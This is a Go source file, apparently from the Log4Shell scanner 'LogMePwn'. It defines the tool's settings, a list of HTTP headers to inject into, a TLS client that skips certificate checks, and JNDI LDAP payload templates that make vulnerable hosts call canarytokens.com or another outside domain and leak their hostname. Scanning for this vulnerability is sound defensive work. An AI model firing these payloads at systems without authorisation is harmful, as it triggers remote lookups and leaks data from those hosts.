package main

import (
	"crypto/tls"
	"fmt"
	"regexp"
	"time"

	"github.com/valyala/fasthttp"
)

var (
	randomScan                              bool
	useJson, useXML                         bool
	maxConcurrent, delay                    int
	hHeaders, hBody, customServer           string
	email, webhook, dummyXML                string
	canaryToken, urlFile, proto             string
	commonHTTPPorts, hMethods, userAgent    string
	commonIMAPPorts, commonSSHPorts         string
	customPayload, headFile, commonFTPPorts string
	allTargets, allHTTPPorts, allSSHPorts   []string
	allMethods, xload, allIMAPPorts         []string
	allFTPPorts                             []string

	procCount  = 1
	canaryResp = new(CanaryResp)
	ProcChan   = make(chan *ProcJob, maxWorkers)
	httpClient = fasthttp.Client{
		MaxIdemponentCallAttempts: 512,
		WriteTimeout:              3 * time.Second,
		MaxConnDuration:           3 * time.Second,
		MaxIdleConnDuration:       2 * time.Second,
		MaxConnWaitTimeout:        5 * time.Second,
		// less emphasis on read because at almost all times
		// we're bound to not get a response and timeout
		ReadTimeout: 3 * time.Second,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	defaultHTTPHeaders = []string{
		"Accept-Charset", "Accept-Datetime", "Accept-Encoding",
		"Accept-Language", "Cache-Control", "Cookie", "DNT",
		"Forwarded", "Forwarded-For", "Forwarded-For-Ip",
		"Forwarded-Proto", "From", "Max-Forwards", "Origin",
		"Pragma", "Referer", "True-Client-IP", "Upgrade",
		"User-Agent", "Via", "Warning", "X-Api-Version",
		"X-Att-DeviceId", "X-Correlation-ID", "X-Csrf-Token",
		"X-Do-Not-Track", "X-Forwarded", "X-Forwarded-By", "X-XSRF-TOKEN",
		"X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Port",
		"X-Forwarded-Proto", "X-Forwarded-Scheme", "X-Forwarded-Server",
		"X-Forwarded-Ssl", "X-Forward-For", "X-From", "X-Geoip-Country",
		"X-Http-Destinationurl", "X-Http-Host-Override", "X-Http-Method",
		"X-Http-Method-Override", "X-Hub-Signature", "X-If-Unmodified-Since",
		"X-ProxyUser-Ip", "X-Requested-With", "X-Request-ID", "X-UIDH",
	}
	lackofart = fmt.Sprintf(`
    +---------------------+
    |   L o g M e P w n   |
    +---------------------+  %s

                ~ 0xInfection`, version)
	cidrRex = regexp.MustCompile(`(?m)^(?:\d{1,3}\.){3}\d{1,3}\/(?:\d|[1-2]\d|3[0-2])$`)
)

type (
	ProcJob struct {
		Host     string
		Method   string
		Protocol string
	}
	CanaryResp struct {
		Token         string      `json:"Token"`
		Hostname      string      `json:"Hostname"`
		URLComponents [][]string  `json:"Url_components"`
		Error         interface{} `json:"Error"`
		URL           string      `json:"Url"`
		ErrorMessage  interface{} `json:"Error_Message"`
		Email         string      `json:"Email"`
		Auth          string      `json:"Auth"`
	}
)

const (
	version           = "v2.0"
	letterBytes       = "abcdefghijklmnopqrstuvwxyz0123456789"
	maxWorkers        = 100
	canaryTokenFormat = "${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"
	genericPayFormat  = "${jndi:ldap://$DNSNAME$--${hostname}.%s/a}"
)
